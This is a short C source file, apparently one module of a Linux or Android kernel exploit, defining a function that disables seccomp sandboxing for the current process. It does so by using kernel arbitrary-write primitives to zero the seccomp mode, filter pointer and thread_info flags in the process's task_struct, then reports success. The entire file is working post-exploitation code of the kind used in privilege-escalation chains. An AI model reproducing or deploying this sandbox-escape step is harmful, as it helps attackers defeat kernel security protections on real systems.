#include "include/seccomp.h"

bool is_seccomp_disabled() {
    return prctl(PR_GET_SECCOMP) == 0;
}


bool disable_seccomp(unsigned long task_struct_addr, unsigned long thread_info_addr) {
    if (is_seccomp_disabled()) {
        printf("[+] SECCOMP is already disabled !\n");
        return true;
    }

    // overwrite task_struct.seccomp structure. Field int mode = 0, struct seccomp_filter *filter
    unsigned long seccomp_addr = task_struct_addr + STRUCT_SECCOMP_OFFSET;
    kernel_write_ulong(thread_info_addr + THREAD_INFO_FLAGS_OFFSET, 0); // thread_info.flags = 0
    kernel_write_uint(seccomp_addr + 0x0, 0);
    kernel_write_ulong(seccomp_addr + 0x8, 0);

    if (!is_seccomp_disabled()) {
        printf("[!] Failed to disable SECCOMP!\n");
        return false;
    }
    printf("[+] Successfully disabled SECCOMP !\n");
    return true;
}
